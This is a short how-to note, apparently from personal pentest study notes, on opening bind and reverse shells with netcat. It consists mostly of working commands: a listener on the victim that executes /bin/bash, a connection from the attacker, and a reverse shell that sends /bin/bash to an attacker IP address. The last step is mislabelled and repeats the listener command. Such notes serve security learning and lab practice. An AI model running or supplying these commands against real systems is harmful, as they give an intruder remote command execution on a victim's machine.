1. Creating a Bind Shell Using Netcat in Victim's PC. Port 1234

```
nc -lvp 1234 -e /bin/bash
```

2. Connect the bind shell using Netcat in attacker.

```
nc -nv ipaddress 1234
```

One of the challenges of using bind shells is that if the victim’s system is behind a firewall, the listening port might be blocked. However, if the victim’s system can initiate a connection to the attacking system on a given port, a reverse shell can be used to overcome this challenge.

3. Creating a listener in attacker.

```
nc -lvp 666
```

4. Connect to attacking system from victim.

```
nc 192.168.78.147 666 -e /bin/bash
```

5. Revere shell from victim

```
nc -lvp 666
```

![[Pasted image 20260830225336.png]]

